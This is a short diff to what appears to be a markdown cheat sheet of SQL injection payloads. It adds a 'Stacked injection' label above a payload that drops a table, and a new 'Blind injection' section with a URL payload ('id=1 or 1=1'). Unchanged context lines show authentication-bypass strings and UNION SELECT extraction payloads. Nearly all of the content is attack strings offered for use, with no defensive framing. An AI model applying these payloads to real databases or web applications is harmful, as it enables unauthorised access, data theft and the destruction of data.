@@ -23,7 +23,7 @@ $SQL = "SELECT * FROM <i>{tablename}</i> WHERE <i>{username}</i> = ' + <b><i>1' 
 1' OR 1+1--
 \'
 ```
-### Where table name is known
+### Stacked injection; Where table name is known
 ```SQL
 1'; DROP TABLE {tablename} --
 ```
@@ -33,3 +33,10 @@ $SQL = "SELECT * FROM <i>{tablename}</i> WHERE <i>{username}</i> = ' + <b><i>1' 
 1' UNION SELECT {columnname} FROM {tablename};--
 1' UNION ALL SELECT {columnname} FROM {tablename};--
 ```
+
+## Blind injection
+Apply in URL
+```SQL
+www.example.com/xxx.php?id=1 or 1=1
+```
+
